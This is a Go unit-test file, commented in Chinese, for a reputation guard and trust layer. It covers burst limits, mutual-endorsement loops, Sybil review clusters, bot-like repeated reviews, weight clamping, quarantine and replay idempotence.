// TestReputationGuard_Burst 滑动窗口边界：窗口内超限 block，窗口外通过，空批次通过。
func TestReputationGuard_Burst(t *testing.T) {
	t.Parallel()
	g := NewReputationGuard(ReputationGuardConfig{BurstLimit: 3})
	base := fixedTime()
	// 窗口内 4 次 → block
	in := []RepEvent{
		repEndorse("a", "b", base),
		repEndorse("a", "b", base.Add(10*time.Second)),
		repEndorse("a", "b", base.Add(20*time.Second)),
		repEndorse("a", "b", base.Add(30*time.Second)),
	}
	if verdict, _ := g.Evaluate(in); verdict != RepBlock {
		t.Errorf("窗口内超限应 block, got %s", verdict)
	}
	// 同量事件但跨度超出 1 分钟窗口 → pass
	out := []RepEvent{
		repEndorse("a", "b", base),
		repEndorse("a", "b", base.Add(30*time.Second)),
		repEndorse("a", "b", base.Add(70*time.Second)),
		repEndorse("a", "b", base.Add(110*time.Second)),
	}
	if verdict, _ := g.Evaluate(out); verdict != RepPass {
		t.Errorf("窗口外同量事件应 pass, got %s", verdict)
	}
	// 空批次直接通过（checkBurst 零长分支）
	if verdict, detail := g.Evaluate(nil); verdict != RepPass || detail != "" {
		t.Errorf("空批次应 pass, got %s %q", verdict, detail)
	}
}

// TestReputationGuard_Circular 互荐环判定：A⇄B block，单向 pass，非 endorse 不成环。
func TestReputationGuard_Circular(t *testing.T) {
	t.Parallel()
	g := NewReputationGuard(ReputationGuardConfig{})
	base := fixedTime()
	// 双向荐 → block
	mutual := []RepEvent{
		repEndorse("a", "b", base),
		repEndorse("b", "a", base),
	}
	if verdict, detail := g.Evaluate(mutual); verdict != RepBlock {
		t.Errorf("互荐环应 block, got %s (%s)", verdict, detail)
	}
	// 单向 → pass
	oneWay := []RepEvent{repEndorse("a", "b", base)}
	if verdict, _ := g.Evaluate(oneWay); verdict != RepPass {
		t.Errorf("单向荐应 pass, got %s", verdict)
	}
	// review 类型不参与成环判定（仅 endorse）
	reviewLoop := []RepEvent{
		{From: "a", To: "b", Kind: RepReview, At: base},
		{From: "b", To: "a", Kind: RepReview, At: base},
	}
	if verdict, _ := g.Evaluate(reviewLoop); verdict != RepPass {
		t.Errorf("review 互评不应判互荐环, got %s", verdict)
	}
}

// TestReputationGuard_Inflation 自报成功率 1.0 无审计链 block。
func TestReputationGuard_Inflation(t *testing.T) {
	t.Parallel()
	g := NewReputationGuard(ReputationGuardConfig{})
	base := fixedTime()
	tests := []struct {
		name    string
		e       RepEvent
		wantErr bool
	}{
		{
			name: "满分自报无审计拒绝",
			e:    RepEvent{From: "n1", Kind: RepScore, Success: 1.0, At: base},
			wantErr: true,
		},
		{
			name: "满分自报有审计通过",
			e:    RepEvent{From: "n1", Kind: RepScore, Success: 1.0, AuditID: "audit-1", At: base},
		},
		{
			name: "非满分自报无审计通过",
			e:    RepEvent{From: "n1", Kind: RepScore, Success: 0.95, At: base},
		},
		{
			name: "满分但审计链为空白拒绝",
			e:    RepEvent{From: "n1", Kind: RepScore, Success: 1.0, AuditID: "   ", At: base},
			wantErr: true,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			verdict, _ := g.Evaluate([]RepEvent{tt.e})
			if tt.wantErr && verdict != RepBlock {
				t.Errorf("应 block, got %s", verdict)
			}
			if !tt.wantErr && verdict != RepPass {
				t.Errorf("应 pass, got %s", verdict)
			}
		})
	}
}

// TestReputationGuard_Sybil 互评簇判定：规模与互评率双阈值。
// 注意：互荐 endorse 双向边会先被 checkCircular 拦截，因此互评簇 block 用例
// 用 review 双向边构造（circular 只查 endorse，sybil 的 union 含 review）。
func TestReputationGuard_Sybil(t *testing.T) {
	t.Parallel()
	base := fixedTime()
	g := NewReputationGuard(ReputationGuardConfig{
		SybilClusterMin: 6, SybilReciprocal: 0.8,
	})
	// 6 节点互评簇：链式 review 连通全簇 + 5 对双向 review
	// → 簇规模 6 ≥ 6，互评对 5（代码按双向各计 1 共 10）/ 6 = 1.67 ≥ 0.8 → block
	var cluster []RepEvent
	for i := 0; i < 6; i++ {
		cluster = append(cluster, RepEvent{
			From: NodeID(fmt.Sprintf("s%d", i)), To: NodeID(fmt.Sprintf("s%d", i+1)),
			Kind: RepReview, At: base,
		})
	}
	for i := 1; i < 6; i++ {
		cluster = append(cluster, RepEvent{
			From: NodeID(fmt.Sprintf("s%d", i)), To: NodeID(fmt.Sprintf("s%d", i-1)),
			Kind: RepReview, At: base,
		})
	}
	if verdict, _ := g.Evaluate(cluster); verdict != RepBlock {
		t.Errorf("高互评簇应 block, got %s", verdict)
	}
	// 6 节点链式单向背书（互评率 0）→ pass
	var chain []RepEvent
	for i := 0; i < 6; i++ {
		chain = append(chain, RepEvent{
			From: NodeID(fmt.Sprintf("c%d", i)), To: NodeID(fmt.Sprintf("c%d", i+1)),
			Kind: RepEndorse, At: base,
		})
	}
	if verdict, _ := g.Evaluate(chain); verdict != RepPass {
		t.Errorf("链式低互评应 pass, got %s", verdict)
	}
	// 规模不足阈值（5 节点互评但 < 6）→ pass
	var small []RepEvent
	for i := 0; i < 2; i++ {
		a, b := NodeID(fmt.Sprintf("t%d", 2*i)), NodeID(fmt.Sprintf("t%d", 2*i+1))
		small = append(small,
			RepEvent{From: a, To: b, Kind: RepReview, At: base},
			RepEvent{From: b, To: a, Kind: RepReview, At: base})
	}
	small = append(small, RepEvent{From: "t4", To: "t0", Kind: RepReview, At: base})
	if verdict, _ := g.Evaluate(small); verdict != RepPass {
		t.Errorf("规模不足应 pass, got %s", verdict)
	}
}

// TestReputationGuard_BotPattern 模板化评审文本 → flag（不拒绝）。
func TestReputationGuard_BotPattern(t *testing.T) {
	t.Parallel()
	g := NewReputationGuard(ReputationGuardConfig{BotRepeatMin: 3})
	base := fixedTime()
	// 3 条相同评审文本 → flag
	var bots []RepEvent
	for i := 0; i < 3; i++ {
		bots = append(bots, RepEvent{From: "n", To: "target", Kind: RepReview, Text: "great work", At: base})
	}
	verdict, detail := g.Evaluate(bots)
	if verdict != RepFlag {
		t.Errorf("模板化重复应 flag, got %s", verdict)
	}
	if !containsSubstr(detail, "3") {
		t.Errorf("详情应含重复次数: %s", detail)
	}
	// 2 条相同 → pass（低于阈值）
	if verdict, _ := g.Evaluate(bots[:2]); verdict != RepPass {
		t.Errorf("低于阈值应 pass, got %s", verdict)
	}
	// 空白文本不计入
	blanks := []RepEvent{
		{From: "n", Kind: RepReview, Text: "  ", At: base},
		{From: "n", Kind: RepReview, Text: "", At: base},
		{From: "n", Kind: RepReview, Text: "\t", At: base},
	}
	if verdict, _ := g.Evaluate(blanks); verdict != RepPass {
		t.Errorf("空白文本不应触发 flag, got %s", verdict)
	}
}

// TestReputationGuard_Priority 多规则同时命中时按 burst → circular → inflation
// → sybil → bot 顺序返回首个 block。
func TestReputationGuard_Priority(t *testing.T) {
	t.Parallel()
	g := NewReputationGuard(ReputationGuardConfig{BurstLimit: 2, SybilClusterMin: 2, SybilReciprocal: 0.5})
	base := fixedTime()
	// 同时含 burst（3 事件）与 circular（a⇄b）：应报 burst
	events := []RepEvent{
		repEndorse("a", "b", base),
		repEndorse("b", "a", base),
		repEndorse("a", "b", base.Add(time.Second)),
	}
	verdict, detail := g.Evaluate(events)
	if verdict != RepBlock {
		t.Fatalf("应 block, got %s", verdict)
	}
	if !containsSubstr(detail, "速率") {
		t.Errorf("应优先报 burst: %s", detail)
	}
}

// TestTruncateRunes 超长文本截断加省略号，短文本原样返回。
func TestTruncateRunes(t *testing.T) {
	t.Parallel()
	if got := truncateRunes("短文本", 24); got != "短文本" {
		t.Errorf("短文本应原样返回, got %q", got)
	}
	long := "这是一段很长的评审文本用于触发截断逻辑"
	got := truncateRunes(long, 5)
	r := []rune(got)
	if len(r) != 6 || string(r[5]) != "…" {
		t.Errorf("截断结果异常: %q", got)
	}
}

// ===== trust.go =====

// TestNewTrustLayer_Errors 构造校验：验签函数必填、钉扎钥 ≥1。
func TestNewTrustLayer_Errors(t *testing.T) {
	t.Parallel()
	if _, err := NewTrustLayer(TrustConfig{PinnedKeys: []string{"k"}}); err == nil {
		t.Error("未注入验签函数应报错")
	}
	if _, err := NewTrustLayer(TrustConfig{Verify: alwaysVerify}); err == nil {
		t.Error("未钉扎签名钥应报错")
	}
	// 零值权重/声誉下限取默认
	tl, err := NewTrustLayer(TrustConfig{Verify: alwaysVerify, PinnedKeys: []string{"k"}})
	if err != nil {
		t.Fatal(err)
	}
	if tl.cfg.MaxEventWeight != 1.0 || tl.cfg.MinReputation != -5 {
		t.Errorf("默认值异常: %v / %v", tl.cfg.MaxEventWeight, tl.cfg.MinReputation)
	}
}

// TestTrustLayer_RecordEventClamp 事件权重钳制与负权重隔离。
func TestTrustLayer_RecordEventClamp(t *testing.T) {
	t.Parallel()
	tl, err := NewTrustLayer(TrustConfig{
		Verify: alwaysVerify, PinnedKeys: []string{"k"},
		MaxEventWeight: 2.0, MinReputation: -4,
	})
	if err != nil {
		t.Fatal(err)
	}
	// 超上限权重钳制到 +2
	tl.RecordEvent(TrustEvent{Node: "n1", Kind: "contribute", Weight: 99, At: fixedTime()})
	if got := tl.Report().Entries[0].Reputation; got != 2.0 {
		t.Errorf("权重应钳制到 2.0, got %v", got)
	}
	// 超下限权重钳制到 -2
	tl.RecordEvent(TrustEvent{Node: "n2", Kind: "violation", Weight: -99, At: fixedTime()})
	for _, e := range tl.Report().Entries {
		if e.Node == "n2" && e.Reputation != -2.0 {
			t.Errorf("负权重应钳制到 -2.0, got %v", e.Reputation)
		}
	}
	// 连续负权重压穿下限 → 隔离（默认 MinReputation=-5：注意 NewTrustLayer 会把
	// ≤0 的 MinReputation 重置为 -5，自定义负阈值不可配——测试按默认值构造）
	tl.RecordEvent(TrustEvent{Node: "n3", Kind: "violation", Weight: -3, At: fixedTime()})
	tl.RecordEvent(TrustEvent{Node: "n3", Kind: "violation", Weight: -2, At: fixedTime()})
	tl.RecordEvent(TrustEvent{Node: "n3", Kind: "violation", Weight: -2, At: fixedTime()})
	rep := tl.Report()
	if len(rep.Quarantined) != 1 || rep.Quarantined[0] != "n3" {
		t.Errorf("n3 应被隔离: %+v", rep.Quarantined)
	}
}

// TestTrustLayer_ReportTieBreak 声誉并列时按节点 ID 升序（确定性排序）。
func TestTrustLayer_ReportTieBreak(t *testing.T) {
	t.Parallel()
	tl := newTrust(t)
	// b 与 a 声誉相同（各 +1）→ 排序应 a 在前
	if err := tl.ReceiveAsset(envelope("x1", NodeID("node-b"), 1, "key-1"), fixedTime()); err != nil {
		t.Fatal(err)
	}
	if err := tl.ReceiveAsset(envelope("x2", NodeID("node-a"), 1, "key-1"), fixedTime()); err != nil {
		t.Fatal(err)
	}
	entries := tl.Report().Entries
	if len(entries) != 2 {
		t.Fatalf("应有 2 个节点, got %d", len(entries))
	}
	if entries[0].Node != NodeID("node-a") || entries[1].Node != NodeID("node-b") {
		t.Errorf("同分应按节点 ID 升序: %+v", entries)
	}
	// 高分在前：node-a 再贡献一次
	if err := tl.ReceiveAsset(envelope("x3", NodeID("node-a"), 1, "key-1"), fixedTime()); err != nil {
		t.Fatal(err)
	}
	entries = tl.Report().Entries
	if entries[0].Node != NodeID("node-a") || entries[0].Reputation != 2 {
		t.Errorf("高声誉节点应在前: %+v", entries)
	}
}

// TestTrustLayer_ZeroClock now 零值回退真实时钟（不 panic 且判贡献）。
func TestTrustLayer_ZeroClock(t *testing.T) {
	t.Parallel()
	tl := newTrust(t)
	if err := tl.ReceiveAsset(envelope("zc-1", NodeID("node-a"), 1, "key-1"), time.Time{}); err != nil {
		t.Fatalf("零时钟应回退 time.Now 并正常接收: %v", err)
	}
	rep := tl.Report()
	if rep.Events != 1 {
		t.Errorf("应记录 1 次贡献事件, got %d", rep.Events)
	}
}

// TestTrustLayer_SameNodeReplayIdempotent 同节点重复接收同一资产：
// 幂等放行且**不加声誉**（修复 2026-09-28：此前无条件 +1，重放可
// 无限刷分；与 federation_test.go"重放不加声誉（幂等）"意图对齐）。
func TestTrustLayer_SameNodeReplayIdempotent(t *testing.T) {
	t.Parallel()
	tl := newTrust(t)
	origin := NodeID("node-a")
	for i := 0; i < 3; i++ {
		if err := tl.ReceiveAsset(envelope("same-asset", origin, 1, "key-1"), fixedTime()); err != nil {
			t.Fatalf("同节点重放应被幂等放行: %v", err)
		}
	}
	var got float64
	for _, e := range tl.Report().Entries {
		if e.Node == origin {
			got = e.Reputation
		}
	}
	if got != 1 {
		t.Errorf("同资产重放 3 次后声誉 = %v, want 1（仅首发计分）", got)
	}
}

// ===== 测试辅助 =====

// sha256Hex / sha256HexBytes 与 gates.go 门 ②同算法（十六进制 sha256）。
func sha256Hex(s string) string { return sha256HexBytes([]byte(s)) }

func sha256HexBytes(b []byte) string {
	sum := sha256.Sum256(b)
	return hex.EncodeToString(sum[:])
}

func containsSubstr(s, sub string) bool {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}

// TestTrustConfig_MinReputationSentinel 0 = 未设置取默认 -5；负值为合法
// 自定义门槛（修复 2026-09-28：此前 <=0 一并重置，-3 无法配置）。
func TestTrustConfig_MinReputationSentinel(t *testing.T) {
	t.Parallel()
	// 未设置（0）→ 默认 -5
	tl0, err := NewTrustLayer(TrustConfig{
		Verify: func([]byte, string, string) error { return nil }, PinnedKeys: []string{"k"},
	})
	if err != nil {
		t.Fatalf("构造失败: %v", err)
	}
	if tl0.cfg.MinReputation != -5 {
		t.Errorf("未设置时应取默认 -5, got %v", tl0.cfg.MinReputation)
	}
	// 自定义负门槛 -3 应保留
	tlNeg, err := NewTrustLayer(TrustConfig{
		Verify: func([]byte, string, string) error { return nil }, PinnedKeys: []string{"k"},
		MinReputation: -3,
	})
	if err != nil {
		t.Fatalf("构造失败: %v", err)
	}
	if tlNeg.cfg.MinReputation != -3 {
		t.Errorf("自定义负门槛 -3 应保留, got %v", tlNeg.cfg.MinReputation)
	}
}
